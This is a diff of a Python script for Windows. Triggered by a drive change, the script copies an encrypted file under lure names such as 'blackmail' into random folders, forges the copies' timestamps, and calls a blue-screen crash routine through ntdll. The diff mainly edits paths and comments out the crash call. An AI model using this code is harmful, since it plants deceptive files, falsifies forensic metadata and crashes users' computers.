@@ -17,10 +17,10 @@ driveList=[]
 encExtList = ['.rst','.txt','.md','.docx','.odt','.html','.ppt','.doc']# random file ext to use
 encNameList = ['secret', 'darkweb', 'db-dump', 'blackmail', 'target', 'golddust'] # random file name to use
 
-srcPath = r'C:\Users\Nyx\Documents\ICT wifi.txt' #CHANGE TO YOUR RESPECTTIVE PATH WHERE YOUR FILE IS
+srcPath = r'C:\Users\yiren\Documents\ICT wifi.txt' #CHANGE TO YOUR RESPECTTIVE PATH WHERE YOUR FILE IS
 password = '31337'
 
-newPath=Path(r'C:\Users\Nyx\Documents') #NEW PATH, MAKE SURE THERE ARE MULTIPLE FOLDER TO ENSURE NEW FILE GO TO MULTIPLE DIRECTORY
+newPath=Path(r'C:\Users\yiren\Documents') #NEW PATH, MAKE SURE THERE ARE MULTIPLE FOLDER TO ENSURE NEW FILE GO TO MULTIPLE DIRECTORY
 
 ntdll = ctypes.windll.ntdll
 setShutDownPriviledge = 19
@@ -75,7 +75,7 @@ Function to create and encrypt file in new directory
 '''
 def fileManip():
     subdirectories = [x for x in newPath.iterdir() if x.is_dir()]
-    dstPathLen =len(subdirectories)-1
+    dstPathLen =len(subdirectories)
     pathSeed=random.sample(range(0,dstPathLen),int(dstPathLen/2))
 
     for x in pathSeed:
@@ -87,7 +87,7 @@ def fileManip():
         a_file = filedate.File(newDstPath)
         new_Metadate=meta_modification()
         a_file.set(
-            created="2022.01.01 13:00:00.123456",
+            created="2020.01.01 13:00:00.123456",
             modified=new_Metadate,
             accessed=new_Metadate
         )
@@ -166,7 +166,7 @@ def watch_drives():#watch for drive change
             runCon=False
             fileManip() #file copying and manipulation function
             time.sleep(10)
-            BSOD() #BSOD function, Please comment it unless using it live
+            # BSOD() #BSOD function, Please comment it unless using it live
 
         time.sleep(1)
 
